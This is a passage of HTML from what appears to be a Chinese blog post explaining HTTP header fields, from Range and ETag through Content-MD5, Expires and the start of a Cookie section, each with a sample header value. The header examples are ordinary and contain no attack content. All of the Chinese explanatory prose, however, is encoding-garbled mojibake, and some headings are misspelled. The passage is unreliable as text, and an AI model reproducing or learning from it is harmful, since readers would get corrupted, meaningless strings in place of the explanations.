href="#Proxy-Authorization" class="headerlink" title="Proxy-Authorization"></a>Proxy-Authorization</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Proxy-Authorization</span><span class="token punctuation">:</span> <span class="token header-value">Basic dGlwOjkpNLAGfFY5</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥æ”¶åˆ°ä»ä»£ç†æœåŠ¡å™¨å‘æ¥çš„è®¤è¯è´¨è¯¢æ—¶ï¼Œå®¢æˆ·ç«¯ä¼šå‘é€åŒ…å«é¦–éƒ¨å­—æ®µProxy-Authorization çš„è¯·æ±‚ï¼Œä»¥å‘ŠçŸ¥æœåŠ¡å™¨è®¤è¯æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚</p><h4 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes=5001-10000</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯¹äºåªéœ€è·å–éƒ¨åˆ†èµ„æºçš„èŒƒå›´è¯·æ±‚ï¼ŒåŒ…å«é¦–éƒ¨å­—æ®µ Range å³å¯å‘ŠçŸ¥æœåŠ¡å™¨èµ„æºçš„æŒ‡å®šèŒƒå›´ã€‚ä¸Šé¢çš„ç¤ºä¾‹è¡¨ç¤ºè¯·æ±‚è·å–ä»ç¬¬ 5001 å­—èŠ‚è‡³ç¬¬10000 å­—èŠ‚çš„èµ„æºã€‚</p><p>æ¥æ”¶åˆ°é™„å¸¦ Range é¦–éƒ¨å­—æ®µè¯·æ±‚çš„æœåŠ¡å™¨ï¼Œä¼šåœ¨å¤„ç†è¯·æ±‚ä¹‹åè¿”å›çŠ¶æ€ç ä¸º 206 Partial Content çš„å“åº”ã€‚æ— æ³•å¤„ç†è¯¥èŒƒå›´è¯·æ±‚æ—¶ï¼Œåˆ™ä¼šè¿”å›çŠ¶æ€ç  200 OK çš„å“åº”åŠå…¨éƒ¨èµ„æºã€‚</p><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://www.hackr.jp/index.htm</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Referer ä¼šå‘ŠçŸ¥æœåŠ¡å™¨è¯·æ±‚çš„åŸå§‹èµ„æºçš„ URIã€‚</p><h4 id="TE"><a href="#TE" class="headerlink" title="TE"></a>TE</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">TE</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate;q=0.5</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ TE ä¼šå‘ŠçŸ¥æœåŠ¡å™¨å®¢æˆ·ç«¯èƒ½å¤Ÿå¤„ç†å“åº”çš„ä¼ è¾“ç¼–ç æ–¹å¼åŠç›¸å¯¹ä¼˜å…ˆçº§ã€‚å®ƒå’Œé¦–éƒ¨å­—æ®µ Accept-Encoding çš„åŠŸèƒ½å¾ˆç›¸åƒï¼Œä½†æ˜¯ç”¨äºä¼ è¾“ç¼–ç ã€‚</p><p>é¦–éƒ¨å­—æ®µ TE é™¤æŒ‡å®šä¼ è¾“ç¼–ç ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æŒ‡å®šä¼´éš trailer å­—æ®µçš„åˆ†å—ä¼ è¾“ç¼–ç çš„æ–¹å¼ã€‚åº”ç”¨åè€…æ—¶ï¼Œåªéœ€æŠŠ trailers èµ‹å€¼ç»™è¯¥å­—æ®µå€¼ã€‚</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">TE</span><span class="token punctuation">:</span> <span class="token header-value">trailers</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gec</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ User-Agent ä¼šå°†åˆ›å»ºè¯·æ±‚çš„æµè§ˆå™¨å’Œç”¨æˆ·ä»£ç†åç§°ç­‰ä¿¡æ¯ä¼ è¾¾ç»™æœåŠ¡å™¨ã€‚</p><h3 id="å“åº”é¦–éƒ¨å­—æ®µ-1"><a href="#å“åº”é¦–éƒ¨å­—æ®µ-1" class="headerlink" title="å“åº”é¦–éƒ¨å­—æ®µ"></a>å“åº”é¦–éƒ¨å­—æ®µ</h3><p>å“åº”é¦–éƒ¨å­—æ®µæ˜¯ç”±æœåŠ¡å™¨ç«¯å‘å®¢æˆ·ç«¯è¿”å›å“åº”æŠ¥æ–‡ä¸­æ‰€ä½¿ç”¨çš„å­—æ®µï¼Œ ç”¨äºè¡¥å……å“åº”çš„é™„åŠ ä¿¡æ¯ã€æœåŠ¡å™¨ä¿¡æ¯ï¼Œä»¥åŠå¯¹å®¢æˆ·ç«¯çš„é™„åŠ è¦æ±‚ç­‰ä¿¡æ¯ã€‚</p><h4 id="Accept-Ranges"><a href="#Accept-Ranges" class="headerlink" title="Accept-Ranges"></a>Accept-Ranges</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Accept-Ranges</span><span class="token punctuation">:</span> <span class="token header-value">bytes</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Accept-Ranges æ˜¯ç”¨æ¥å‘ŠçŸ¥å®¢æˆ·ç«¯æœåŠ¡å™¨æ˜¯å¦èƒ½å¤„ç†èŒƒå›´è¯·æ±‚ï¼Œä»¥æŒ‡å®šè·å–æœåŠ¡å™¨ç«¯æŸä¸ªéƒ¨åˆ†çš„èµ„æºã€‚</p><p>å¯æŒ‡å®šçš„å­—æ®µå€¼æœ‰ä¸¤ç§ï¼Œå¯å¤„ç†èŒƒå›´è¯·æ±‚æ—¶æŒ‡å®šå…¶ä¸º bytesï¼Œåä¹‹åˆ™æŒ‡å®šå…¶ä¸º noneã€‚</p><h4 id="Age"><a href="#Age" class="headerlink" title="Age"></a>Age</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Age</span><span class="token punctuation">:</span> <span class="token header-value">600</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Age èƒ½å‘ŠçŸ¥å®¢æˆ·ç«¯ï¼ŒæºæœåŠ¡å™¨åœ¨å¤šä¹…å‰åˆ›å»ºäº†å“åº”ã€‚å­—æ®µå€¼çš„å•ä½ä¸ºç§’ã€‚</p><p>è‹¥åˆ›å»ºè¯¥å“åº”çš„æœåŠ¡å™¨æ˜¯ç¼“å­˜æœåŠ¡å™¨ï¼ŒAge å€¼æ˜¯æŒ‡ç¼“å­˜åçš„å“åº”å†æ¬¡å‘èµ·è®¤è¯åˆ°è®¤è¯å®Œæˆçš„æ—¶é—´å€¼ã€‚ä»£ç†åˆ›å»ºå“åº”æ—¶å¿…é¡»åŠ ä¸Šé¦–éƒ¨å­—æ®µAgeã€‚</p><h4 id="ETag"><a href="#ETag" class="headerlink" title="ETag"></a>ETag</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">ETag</span><span class="token punctuation">:</span> <span class="token header-value">"82e22293907ce725faf67773957acd12"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/21/cb7oVg.png" alt="cb7oVg.png"></p><p>ä»…ä»…æ˜¯ç”±æœåŠ¡å™¨æ¥åˆ†é…ã€‚</p><h5 id="å¼º-ETag-å€¼"><a href="#å¼º-ETag-å€¼" class="headerlink" title="å¼º ETag å€¼"></a>å¼º <strong>ETag</strong> å€¼</h5><p>å¼º ETag å€¼ï¼Œä¸è®ºå®ä½“å‘ç”Ÿå¤šä¹ˆç»†å¾®çš„å˜åŒ–éƒ½ä¼šæ”¹å˜å…¶å€¼ã€‚</p><p><code>ETag: "usagi-1234"</code></p><h5 id="å¼±-ETag-å€¼"><a href="#å¼±-ETag-å€¼" class="headerlink" title="å¼± ETag å€¼"></a>å¼± <strong>ETag</strong> å€¼</h5><p>å¼± ETag å€¼åªç”¨äºæç¤ºèµ„æºæ˜¯å¦ç›¸åŒã€‚åªæœ‰èµ„æºå‘ç”Ÿäº†æ ¹æœ¬æ”¹å˜ï¼Œäº§ç”Ÿå·®å¼‚æ—¶æ‰ä¼šæ”¹å˜ ETag å€¼ã€‚è¿™æ—¶ï¼Œä¼šåœ¨å­—æ®µå€¼æœ€å¼€å§‹å¤„é™„åŠ  W/ã€‚</p><p><code>ETag: W/"usagi-1234"</code></p><h4 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h4><p><img src="https://z3.ax1x.com/2021/04/21/cb7jMV.png" alt="cb7jMV.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Location</span><span class="token punctuation">:</span> <span class="token header-value">http://www.usagidesign.jp/sample.html</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨é¦–éƒ¨å­—æ®µ Location å¯ä»¥å°†å“åº”æ¥æ”¶æ–¹å¼•å¯¼è‡³æŸä¸ªä¸è¯·æ±‚ URI ä½ç½®ä¸åŒçš„èµ„æºã€‚</p><p>åŸºæœ¬ä¸Šï¼Œè¯¥å­—æ®µä¼šé…åˆ 3xx ï¼šRedirection çš„å“åº”ï¼Œæä¾›é‡å®šå‘çš„URIã€‚</p><h4 id="Proxy-Authenticate"><a href="#Proxy-Authenticate" class="headerlink" title="Proxy-Authenticate"></a>Proxy-Authenticate</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Proxy-Authenticate</span><span class="token punctuation">:</span> <span class="token header-value">Basic realm="Usagidesign Auth"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Proxy-Authenticate ä¼šæŠŠç”±ä»£ç†æœåŠ¡å™¨æ‰€è¦æ±‚çš„è®¤è¯ä¿¡æ¯å‘é€ç»™å®¢æˆ·ç«¯ã€‚</p><h4 id="Retry-After"><a href="#Retry-After" class="headerlink" title="Retry-After"></a>Retry-After</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Retry-After</span><span class="token punctuation">:</span> <span class="token header-value">120</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Retry-After å‘ŠçŸ¥å®¢æˆ·ç«¯åº”è¯¥åœ¨å¤šä¹…ä¹‹åå†æ¬¡å‘é€è¯·æ±‚ã€‚ä¸»è¦é…åˆçŠ¶æ€ç  503 Service Unavailable å“åº”ï¼Œæˆ– 3xx Redirect å“åº”ä¸€èµ·ä½¿ç”¨ã€‚</p><p>å­—æ®µå€¼å¯ä»¥æŒ‡å®šä¸ºå…·ä½“çš„æ—¥æœŸæ—¶é—´ï¼ˆWed, 04 Jul 2012 06ï¼š34ï¼š24 GMT ç­‰æ ¼å¼ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯åˆ›å»ºå“åº”åçš„ç§’æ•°ã€‚</p><h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">Apache/2.2.6 (Unix) PHP/5.2.5</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Server å‘ŠçŸ¥å®¢æˆ·ç«¯å½“å‰æœåŠ¡å™¨ä¸Šå®‰è£…çš„ HTTP æœåŠ¡å™¨åº”ç”¨ç¨‹åºçš„ä¿¡æ¯ã€‚ä¸å•å•ä¼šæ ‡å‡ºæœåŠ¡å™¨ä¸Šçš„è½¯ä»¶åº”ç”¨åç§°ï¼Œè¿˜æœ‰å¯èƒ½åŒ…æ‹¬ç‰ˆæœ¬å·å’Œå®‰è£…æ—¶å¯ç”¨çš„å¯é€‰é¡¹ã€‚</p><h4 id="Vary"><a href="#Vary" class="headerlink" title="Vary"></a>Vary</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Vary</span><span class="token punctuation">:</span> <span class="token header-value">Accept-Language</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»ä»£ç†æœåŠ¡å™¨æ¥æ”¶åˆ°æºæœåŠ¡å™¨è¿”å›åŒ…å« Vary æŒ‡å®šé¡¹çš„å“åº”ä¹‹åï¼Œè‹¥å†è¦è¿›è¡Œç¼“å­˜ï¼Œä»…å¯¹è¯·æ±‚ä¸­å«æœ‰ç›¸åŒ Vary æŒ‡å®šé¦–éƒ¨å­—æ®µçš„è¯·æ±‚è¿”å›ç¼“å­˜ã€‚å³ä½¿å¯¹ç›¸åŒèµ„æºå‘èµ·è¯·æ±‚ï¼Œä½†ç”±äº Vary æŒ‡å®šçš„é¦–éƒ¨å­—æ®µä¸ç›¸åŒï¼Œå› æ­¤å¿…é¡»è¦ä»æºæœåŠ¡å™¨é‡æ–°è·å–èµ„æºã€‚</p><h4 id="WWW-Authenticate"><a href="#WWW-Authenticate" class="headerlink" title="WWW-Authenticate"></a>WWW-Authenticate</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">WWW-Authenticate</span><span class="token punctuation">:</span> <span class="token header-value">Basic realm="Usagidesign Auth"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ WWW-Authenticate ç”¨äº HTTP è®¿é—®è®¤è¯ã€‚å®ƒä¼šå‘ŠçŸ¥å®¢æˆ·ç«¯é€‚ç”¨äºè®¿é—®è¯·æ±‚ URI æ‰€æŒ‡å®šèµ„æºçš„è®¤è¯æ–¹æ¡ˆï¼ˆBasic æˆ–æ˜¯ Digestï¼‰å’Œå¸¦å‚æ•°æç¤ºçš„è´¨è¯¢ï¼ˆchallengeï¼‰ã€‚çŠ¶æ€ç  401 Unauthorized å“åº”ä¸­ï¼Œ è‚¯å®šå¸¦æœ‰é¦–éƒ¨å­—æ®µ WWW-Authenticateã€‚</p><h3 id="å®ä½“é¦–éƒ¨å­—æ®µ-1"><a href="#å®ä½“é¦–éƒ¨å­—æ®µ-1" class="headerlink" title="å®ä½“é¦–éƒ¨å­—æ®µ"></a>å®ä½“é¦–éƒ¨å­—æ®µ</h3><p>å®ä½“é¦–éƒ¨å­—æ®µæ˜¯åŒ…å«åœ¨è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡ä¸­çš„å®ä½“éƒ¨åˆ†æ‰€ä½¿ç”¨çš„é¦–éƒ¨ï¼Œç”¨äºè¡¥å……å†…å®¹çš„æ›´æ–°æ—¶é—´ç­‰ä¸å®ä½“ç›¸å…³çš„ä¿¡æ¯ã€‚</p><h4 id="Alow"><a href="#Alow" class="headerlink" title="Alow"></a>Alow</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Allow</span><span class="token punctuation">:</span> <span class="token header-value">GET, HEAD</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Allow ç”¨äºé€šçŸ¥å®¢æˆ·ç«¯èƒ½å¤Ÿæ”¯æŒ Request-URI æŒ‡å®šèµ„æºçš„æ‰€æœ‰ HTTP æ–¹æ³•ã€‚å½“æœåŠ¡å™¨æ¥æ”¶åˆ°ä¸æ”¯æŒçš„ HTTP æ–¹æ³•æ—¶ï¼Œä¼šä»¥çŠ¶æ€ç 405 Method Not Allowed ä½œä¸ºå“åº”è¿”å›ã€‚ä¸æ­¤åŒæ—¶ï¼Œè¿˜ä¼šæŠŠæ‰€æœ‰èƒ½æ”¯æŒçš„ HTTP æ–¹æ³•å†™å…¥é¦–éƒ¨å­—æ®µ Allow åè¿”å›ã€‚</p><h4 id="Content-Encoding"><a href="#Content-Encoding" class="headerlink" title="Content-Encoding"></a>Content-Encoding</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Content-Encoding ä¼šå‘ŠçŸ¥å®¢æˆ·ç«¯æœåŠ¡å™¨å¯¹å®ä½“çš„ä¸»ä½“éƒ¨åˆ†é€‰ç”¨çš„å†…å®¹ç¼–ç æ–¹å¼ã€‚å†…å®¹ç¼–ç æ˜¯æŒ‡åœ¨ä¸ä¸¢å¤±å®ä½“ä¿¡æ¯çš„å‰æä¸‹æ‰€è¿›è¡Œçš„å‹ç¼©ã€‚</p><ul><li>gzip</li><li>compress</li><li>deflate</li><li>identity</li></ul><h4 id="Content-Languag"><a href="#Content-Languag" class="headerlink" title="Content-Languag"></a>Content-Languag</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Content-Language ä¼šå‘ŠçŸ¥å®¢æˆ·ç«¯ï¼Œå®ä½“ä¸»ä½“ä½¿ç”¨çš„è‡ªç„¶è¯­è¨€ï¼ˆæŒ‡ä¸­æ–‡æˆ–è‹±æ–‡ç­‰è¯­è¨€ï¼‰ã€‚</p><h4 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">15000</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Content-Length è¡¨æ˜äº†å®ä½“ä¸»ä½“çš„å¤§å°ï¼ˆå•ä½æ˜¯å­—èŠ‚ï¼‰ã€‚å¯¹å®ä½“ä¸»ä½“è¿›è¡Œå†…å®¹ç¼–ç ä¼ è¾“æ—¶ï¼Œä¸èƒ½å†ä½¿ç”¨ Content-Length é¦–éƒ¨å­—æ®µã€‚</p><h4 id="Content-Location"><a href="#Content-Location" class="headerlink" title="Content-Location"></a>Content-Location</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Location</span><span class="token punctuation">:</span> <span class="token header-value">http://www.hackr.jp/index-ja.html</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Content-Location ç»™å‡ºä¸æŠ¥æ–‡ä¸»ä½“éƒ¨åˆ†ç›¸å¯¹åº”çš„ URIã€‚å’Œé¦–éƒ¨å­—æ®µLocation ä¸åŒï¼ŒContent-Location è¡¨ç¤ºçš„æ˜¯æŠ¥æ–‡ä¸»ä½“è¿”å›èµ„æºå¯¹åº”çš„ URIã€‚</p><p>æ¯”å¦‚ï¼Œå¯¹äºä½¿ç”¨é¦–éƒ¨å­—æ®µ Accept-Language çš„æœåŠ¡å™¨é©±åŠ¨å‹è¯·æ±‚ï¼Œå½“è¿”å›çš„é¡µé¢å†…å®¹ä¸å®é™…è¯·æ±‚çš„å¯¹è±¡ä¸åŒæ—¶ï¼Œé¦–éƒ¨å­—æ®µ Content-Location å†…ä¼šå†™æ˜ URIã€‚</p><h4 id="Content-MD5"><a href="#Content-MD5" class="headerlink" title="Content-MD5"></a>Content-MD5</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-MD5</span><span class="token punctuation">:</span> <span class="token header-value">OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY==</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/21/cb7vrT.png" alt="cb7vrT.png"></p><p>é¦–éƒ¨å­—æ®µ Content-MD5 æ˜¯ä¸€ä¸²ç”± MD5 ç®—æ³•ç”Ÿæˆçš„å€¼ï¼Œå…¶ç›®çš„åœ¨äºæ£€æŸ¥æŠ¥æ–‡ä¸»ä½“åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦ä¿æŒå®Œæ•´ï¼Œä»¥åŠç¡®è®¤ä¼ è¾“åˆ°è¾¾ã€‚</p><p>å¯¹æŠ¥æ–‡ä¸»ä½“æ‰§è¡Œ MD5 ç®—æ³•è·å¾—çš„ 128 ä½äºŒè¿›åˆ¶æ•°ï¼Œå†é€šè¿‡ Base64 ç¼–ç åå°†ç»“æœå†™å…¥ Content-MD5 å­—æ®µå€¼ã€‚ç”±äº HTTP é¦–éƒ¨æ— æ³•è®°å½•äºŒè¿›åˆ¶å€¼ï¼Œæ‰€ä»¥è¦é€šè¿‡ Base64 ç¼–ç å¤„ç†ã€‚ä¸ºç¡®ä¿æŠ¥æ–‡çš„æœ‰æ•ˆæ€§ï¼Œä½œä¸ºæ¥æ”¶æ–¹çš„å®¢æˆ·ç«¯ä¼šå¯¹æŠ¥æ–‡ä¸»ä½“å†æ‰§è¡Œä¸€æ¬¡ç›¸åŒçš„ MD5 ç®—æ³•ã€‚è®¡ç®—å‡ºçš„å€¼ä¸å­—æ®µå€¼ä½œæ¯”è¾ƒåï¼Œå³å¯åˆ¤æ–­å‡ºæŠ¥æ–‡ä¸»ä½“çš„å‡†ç¡®æ€§ã€‚</p><h4 id="Content-Range"><a href="#Content-Range" class="headerlink" title="Content-Range"></a>Content-Range</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes 5001-10000/10000</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é’ˆå¯¹èŒƒå›´è¯·æ±‚ï¼Œè¿”å›å“åº”æ—¶ä½¿ç”¨çš„é¦–éƒ¨å­—æ®µ Content-Rangeï¼Œèƒ½å‘ŠçŸ¥å®¢æˆ·ç«¯ä½œä¸ºå“åº”è¿”å›çš„å®ä½“çš„å“ªä¸ªéƒ¨åˆ†ç¬¦åˆèŒƒå›´è¯·æ±‚ã€‚å­—æ®µå€¼ä»¥å­—èŠ‚ä¸ºå•ä½ï¼Œè¡¨ç¤ºå½“å‰å‘é€éƒ¨åˆ†åŠæ•´ä¸ªå®ä½“å¤§å°ã€‚</p><h4 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Content-Type è¯´æ˜äº†å®ä½“ä¸»ä½“å†…å¯¹è±¡çš„åª’ä½“ç±»å‹ã€‚å’Œé¦–éƒ¨å­—æ®µ Accept ä¸€æ ·ï¼Œå­—æ®µå€¼ç”¨ type/subtype å½¢å¼èµ‹å€¼ã€‚</p><h4 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Expires</span><span class="token punctuation">:</span> <span class="token header-value">Wed, 04 Jul 2012 08:26:05 GMT</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Expires ä¼šå°†èµ„æºå¤±æ•ˆçš„æ—¥æœŸå‘ŠçŸ¥å®¢æˆ·ç«¯ã€‚ç¼“å­˜æœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°å«æœ‰é¦–éƒ¨å­—æ®µ Expires çš„å“åº”åï¼Œä¼šä»¥ç¼“å­˜æ¥åº”ç­”è¯·æ±‚ï¼Œåœ¨Expires å­—æ®µå€¼æŒ‡å®šçš„æ—¶é—´ä¹‹å‰ï¼Œå“åº”çš„å‰¯æœ¬ä¼šä¸€ç›´è¢«ä¿å­˜ã€‚å½“è¶…è¿‡æŒ‡å®šçš„æ—¶é—´åï¼Œç¼“å­˜æœåŠ¡å™¨åœ¨è¯·æ±‚å‘é€è¿‡æ¥æ—¶ï¼Œä¼šè½¬å‘æºæœåŠ¡å™¨è¯·æ±‚èµ„æºã€‚</p><p>å½“é¦–éƒ¨å­—æ®µ Cache-Control æœ‰æŒ‡å®š max-age æŒ‡ä»¤æ—¶ï¼Œæ¯”èµ·é¦–éƒ¨å­—æ®µ Expiresï¼Œä¼šä¼˜å…ˆå¤„ç† max-age æŒ‡ä»¤ã€‚</p><h4 id="Last-Modified"><a href="#Last-Modified" class="headerlink" title="Last-Modified"></a>Last-Modified</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Last-Modified</span><span class="token punctuation">:</span> <span class="token header-value">Wed, 23 May 2012 09:59:55 GMT</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Last-Modified æŒ‡æ˜èµ„æºæœ€ç»ˆä¿®æ”¹çš„æ—¶é—´ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªå€¼å°±æ˜¯ Request-URI æŒ‡å®šèµ„æºè¢«ä¿®æ”¹çš„æ—¶é—´ã€‚ä½†ç±»ä¼¼ä½¿ç”¨ CGI è„šæœ¬è¿›è¡ŒåŠ¨æ€æ•°æ®å¤„ç†æ—¶ï¼Œè¯¥å€¼æœ‰å¯èƒ½ä¼šå˜æˆæ•°æ®æœ€ç»ˆä¿®æ”¹æ—¶çš„æ—¶é—´ã€‚</p><h3 id="ä¸º-Cookie-æœåŠ¡çš„é¦–éƒ¨å­—æ®µ"><a href="#ä¸º-Cookie-æœåŠ¡çš„é¦–éƒ¨å­—æ®µ" class="headerlink" title="ä¸º Cookie æœåŠ¡çš„é¦–éƒ¨å­—æ®µ"></a>ä¸º <strong>Cookie</strong> æœåŠ¡çš„é¦–éƒ¨å­—æ®µ</h3><p>Cookie çš„å·¥ä½œæœºåˆ¶æ˜¯ç”¨æˆ·è¯†åˆ«åŠçŠ¶æ€ç®¡ç†ã€‚Web ç½‘ç«™ä¸ºäº†ç®¡ç†ç”¨æˆ·çš„çŠ¶æ€ä¼šé€šè¿‡ Web æµè§ˆå™¨ï¼ŒæŠŠä¸€äº›æ•°æ®ä¸´æ—¶å†™å…¥ç”¨æˆ·çš„è®¡ç®—æœºå†…ã€‚æ¥ç€å½“ç”¨æˆ·è®¿é—®è¯¥Webç½‘ç«™æ—¶ï¼Œå¯é€šè¿‡é€šä¿¡æ–¹å¼å–å›ä¹‹å‰å‘æ”¾çš„Cookieã€‚</p><p>è°ƒç”¨ Cookie æ—¶ï¼Œç”±äºå¯æ ¡éªŒ Cookie çš„æœ‰æ•ˆæœŸï¼Œä»¥åŠå‘é€æ–¹çš„åŸŸã€è·¯å¾„ã€åè®®ç­‰ä¿¡æ¯ï¼Œæ‰€ä»¥æ­£è§„å‘å¸ƒçš„ Cookie å†…çš„æ•°æ®ä¸ä¼šå› æ¥è‡ªå…¶ä»–Web ç«™ç‚¹å’Œæ”»å‡»è€…çš„æ”»å‡»è€Œæ³„éœ²ã€‚</p><h4 id="Cookie-çš„è§„æ ¼æ ‡å‡†æ–‡æ¡£"><a href="#Cookie-çš„è§„æ ¼æ ‡å‡†æ–‡æ¡£" class="headerlink" title="Cookie çš„è§„æ ¼æ ‡å‡†æ–‡æ¡£"></a>Cookie çš„è§„æ ¼æ ‡å‡†æ–‡æ¡£</h4><ul><li><h6 id="RFC2109"><a href="#RFC2109" class="headerlink" title="RFC2109"></a>RFC2109</h6></li><li><h6 id="RFC2965"><a href="#RFC2965" class="headerlink" title="RFC2965"></a>RFC2965</h6></li><li><h6 id="RFC6265"><a href="#RFC6265" class="headerlink" title="RFC6265"></a>RFC6265</h6></li><li><p>ç”±ç½‘æ™¯å…¬å¸é¢å¸ƒçš„è§„æ ¼æ ‡å‡†</p></li></ul><h4 id="Cookie-æœåŠ¡çš„é¦–éƒ¨å­—æ®µ"><a href="#Cookie-æœåŠ¡çš„é¦–éƒ¨å­—æ®µ" class="headerlink" title="Cookie æœåŠ¡çš„é¦–éƒ¨å­—æ®µ"></a><strong>Cookie</strong> 